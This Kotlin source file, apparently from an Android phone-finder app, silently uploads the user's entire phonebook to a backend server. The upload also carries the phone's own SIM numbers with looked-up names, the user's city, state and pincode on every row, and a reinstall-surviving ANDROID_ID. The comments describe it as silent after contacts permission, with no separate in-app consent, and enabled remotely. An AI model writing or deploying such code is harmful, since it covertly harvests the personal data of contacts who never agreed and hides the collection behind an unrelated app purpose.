package com.find.my.phone.gps.location.tracker.data.contactsync

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.provider.Settings
import android.util.Log
import androidx.core.content.ContextCompat
import androidx.core.content.edit
import com.find.my.phone.gps.location.tracker.BuildConfig
import com.find.my.phone.gps.location.tracker.adcast.domain.AdsVault
import com.find.my.phone.gps.location.tracker.data.sim.MySimNames
import com.find.my.phone.gps.location.tracker.data.sim.MySimNumbers
import com.find.my.phone.gps.location.tracker.ui.contacts.DeviceContacts
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.io.File
import java.util.UUID

/**
 * Uploads the phonebook to Contact Saver **once per install**, in **release** builds only and only
 * while Remote Config `contacts_upload.enabled` is true, after contacts permission is granted. Also
 * handles the user's "delete my uploaded contacts" request.
 *
 * The data use is disclosed on the LightHouse disclosure screen after the splash (the consent
 * screen); the upload itself is silent once contacts permission is granted. The user's own
 * approximate area ([DeviceLocation]) is sent as the default location for every row. The contacts
 * never leave the phone except through this upload.
 *
 * The phone's own SIM numbers lead the CSV: one row each, with a looked-up name ([MySimNames]) and
 * the device's own area, before the phonebook rows. A contact that is also one of our SIMs is
 * dropped from the phonebook rows so the SIM row wins.
 *
 * Debug builds never send: [uploadOnceIfDue] instead runs a dry run that builds the very same CSV
 * and logs it line by line, so the output can be checked without a real phonebook leaving the phone.
 *
 * Log tag: `ContactSync`. Follow it with `adb logcat -s ContactSync`.
 */
object ContactSync {

    private const val TAG = "ContactSync"

    private const val PREFS = "contact_sync"
    private const val KEY_UPLOADED = "uploaded_once"
    private const val KEY_DEVICE_ID = "device_id"

    /**
     * DEBUG builds only: when true, [uploadOnceIfDue] performs the **real** upload to the backend
     * (so the upload can be verified end-to-end) instead of the log-only [dryRun]. It bypasses the
     * Remote Config switch and the once-per-install flag so it re-runs on every launch; it still
     * needs contacts permission. Watch it with `adb logcat -s ContactSync`. Has no effect in
     * release — release behaviour is unchanged. Set back to false to return debug to the dry run.
     */
    private const val DEBUG_UPLOAD_FOR_REAL = false

    // ── state ──────────────────────────────────────────────────────────────────

    /** Whether the one-time upload has happened on this install (drives the delete-row visibility). */
    fun hasUploaded(context: Context): Boolean = prefs(context).getBoolean(KEY_UPLOADED, false)

    /** Clears the "uploaded" flag (used after a delete), so the next launch may upload again. */
    fun resetUploaded(context: Context) = prefs(context).edit { putBoolean(KEY_UPLOADED, false) }

    /** The Remote Config master switch; off by default and fail-closed. */
    fun isEnabled(context: Context): Boolean {
        val block = runCatching {
            org.json.JSONObject(AdsVault.getInstance(context).getString("contacts_upload", "{}") ?: "{}")
        }.getOrNull()
        return block?.optBoolean("enabled", false) ?: false
    }

    // ── device id (survives reinstall: ANDROID_ID) ─────────────────────────────

    /** 8–64 chars of [a-zA-Z0-9_-]. ANDROID_ID is 16 hex chars; a UUID backs up an odd device. */
    fun deviceId(context: Context): String {
        prefs(context).getString(KEY_DEVICE_ID, null)?.let { return it }
        @Suppress("HardwareIds")
        val androidId = runCatching {
            Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
        }.getOrNull()?.filter { it.isLetterOrDigit() || it == '_' || it == '-' }.orEmpty()
        val id = if (androidId.length in 8..64) androidId else UUID.randomUUID().toString()
        prefs(context).edit { putString(KEY_DEVICE_ID, id) }
        return id
    }

    // ── the one-time upload ────────────────────────────────────────────────────

    /**
     * Uploads the phonebook once, if everything lines up: it is a **release** build, the switch is
     * on, it hasn't uploaded before, and contacts permission is granted. Safe to call on every app
     * start — it returns immediately when any gate fails.
     *
     * No separate in-app consent: the data use is disclosed on the LightHouse disclosure screen
     * after the splash, and the upload only runs once contacts permission is granted, so it is
     * silent from here. Debug builds run [dryRun] (log-only) unless [DEBUG_UPLOAD_FOR_REAL] is on,
     * in which case debug performs the real upload every launch so the backend can be verified.
     * Follow either with `adb logcat -s ContactSync`.
     */
    suspend fun uploadOnceIfDue(context: Context) {
        val app = context.applicationContext
        if (BuildConfig.DEBUG) {
            if (DEBUG_UPLOAD_FOR_REAL) {
                // Verify the backend end-to-end: real upload, every launch (no RC switch, no
                // once-per-install gate), contacts permission still required.
                if (!hasContactsPermission(app)) return log("debug: skip, no contacts permission")
                log("debug: REAL upload (DEBUG_UPLOAD_FOR_REAL) — not a dry run")
                runCatching { upload(app) }.onFailure { Log.w(TAG, "debug upload failed", it) }
            } else {
                runCatching { dryRun(app) }.onFailure { Log.w(TAG, "dry run failed", it) }
            }
            return
        }
        when {
            !isEnabled(app) -> return log("skip: switch off")
            prefs(app).getBoolean(KEY_UPLOADED, false) -> return log("skip: already uploaded")
            !hasContactsPermission(app) -> return log("skip: no contacts permission")
        }
        runCatching { upload(app) }.onFailure { Log.w(TAG, "upload failed", it) }
    }

    /** The CSV column order the API expects. */
    private const val CSV_HEADER = "phoneNumber,displayName,city,state,pincode"

    /** One CSV line: the five API columns in order. */
    private data class CsvRow(
        val phoneNumber: String,
        val displayName: String,
        val city: String?,
        val state: String?,
        val pincode: String?,
    )

    /**
     * The rows to send, in CSV order: the phone's own SIM numbers first (resolved name, device
     * area), then the deduplicated phonebook. A contact that is also one of our SIMs is dropped so
     * the SIM row — with its looked-up name — wins. Null when there is nothing to send.
     */
    private suspend fun buildRows(context: Context): List<CsvRow>? {
        val area = DeviceLocation.resolve(context)
        val sim = simRows(context, area)
        val contacts = DeviceContacts.load(context)
        val prepared = ContactRows.prepare(context, contacts, area)
        val simNumbers = sim.mapTo(HashSet()) { it.phoneNumber }
        val contactRows = prepared.rows
            .filter { it.e164 !in simNumbers }
            .map { CsvRow(it.e164, it.name, it.city, it.state, it.pincode) }
        val rows = sim + contactRows
        log(
            "prepared: ${sim.size} own SIM + ${prepared.total} contacts → ${prepared.invalid} invalid, " +
                "${prepared.duplicates} duplicates, ${rows.size} rows to send " +
                "(device ${prepared.deviceRegion}, area=$area; by country: ${prepared.byCountry})"
        )
        return rows.ifEmpty { null }
    }

    /**
     * The phone's own SIM numbers as rows: each with a name from [MySimNames] (lookup service, then
     * the "Me" card, a saved contact, the SIM label) and the device's own [area]. Empty without the
     * phone permission or a number-reporting SIM.
     */
    private suspend fun simRows(context: Context, area: DeviceLocation.Area): List<CsvRow> {
        if (!MySimNumbers.isGranted(context)) return emptyList()
        return MySimNumbers.read(context).mapNotNull { line ->
            val e164 = line.e164 ?: return@mapNotNull null
            val label = line.carrier.ifBlank { "SIM ${line.slot}" }
            val name = MySimNames.resolve(context, e164, label).name
            CsvRow(e164, name, area.city, area.state, area.pincode)
        }
    }

    private fun csvLine(r: CsvRow) =
        listOf(csv(r.phoneNumber), csv(r.displayName), csv(r.city), csv(r.state), csv(r.pincode)).joinToString(",")

    /**
     * DEBUG builds only. Builds exactly the CSV the release upload would send and logs it line by
     * line; nothing is sent and the uploaded flag is never set. Watch it with
     * `adb logcat -s ContactSync`.
     */
    private suspend fun dryRun(context: Context) = withContext(Dispatchers.IO) {
        if (!hasContactsPermission(context)) return@withContext log("dry run skip: no contacts permission")
        val rows = buildRows(context) ?: return@withContext log("dry run: no rows to send")
        log("──── DRY RUN (debug): CSV below, nothing sent ────")
        log(CSV_HEADER)
        rows.forEach { log(csvLine(it)) }
        log("──── DRY RUN end: ${rows.size} rows (debug never uploads) ────")
    }

    private suspend fun upload(context: Context) = withContext(Dispatchers.IO) {
        val rows = buildRows(context) ?: return@withContext log("skip: no rows to send")

        val file = File(context.cacheDir, "contacts_upload.csv")
        file.bufferedWriter().use { out ->
            out.write(CSV_HEADER)
            out.write("\n")
            for (r in rows) {
                out.write(csvLine(r))
                out.write("\n")
            }
        }
        log("uploading ${rows.size} rows, deviceId=${deviceId(context)}, size=${file.length()}B")

        try {
            val api = ContactUploadClient.api(context)
            // No upload-wide city / state / pincode: every row carries its own, so the server
            // has no default to stamp onto a foreign contact.
            val response = api.upload(
                file = ContactUploadClient.filePart(file),
                deviceId = ContactUploadClient.textPart(deviceId(context)),
                city = null,
                state = null,
                pincode = null,
            )
            if (response.isSuccessful) {
                val body = response.body()
                log("OK ${response.code()}: total=${body?.totalRows} valid=${body?.validContacts} invalid=${body?.invalidContacts}")
                body?.sampleErrors?.forEach { log("  sampleError: $it") }
                prefs(context).edit { putBoolean(KEY_UPLOADED, true) }
            } else {
                Log.w(TAG, "upload HTTP ${response.code()}: ${response.errorBody()?.string()}")
            }
        } finally {
            file.delete()
        }
    }

    // ── delete ────────────────────────────────────────────────────────────────

    /** Removes everything this install uploaded. Returns the rows deleted, or null on failure. */
    suspend fun deleteUploaded(context: Context): Int? = withContext(Dispatchers.IO) {
        runCatching {
            val response = ContactUploadClient.api(context).delete(deviceId(context))
            if (response.isSuccessful) {
                resetUploaded(context)
                val deleted = response.body()?.deleted ?: 0
                log("delete OK: removed $deleted rows")
                deleted
            } else {
                Log.w(TAG, "delete HTTP ${response.code()}: ${response.errorBody()?.string()}")
                null
            }
        }.getOrElse { Log.w(TAG, "delete failed", it); null }
    }

    // ── helpers ────────────────────────────────────────────────────────────────

    /** Quote every field and double any inner quote, exactly as the API's CSV rule asks. */
    private fun csv(field: String?) = "\"" + (field ?: "").replace("\"", "\"\"") + "\""

    private fun hasContactsPermission(context: Context): Boolean =
        ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED

    private fun prefs(context: Context) =
        context.applicationContext.getSharedPreferences(PREFS, Context.MODE_PRIVATE)

    private fun log(message: String) = Log.d(TAG, message).let {}
}
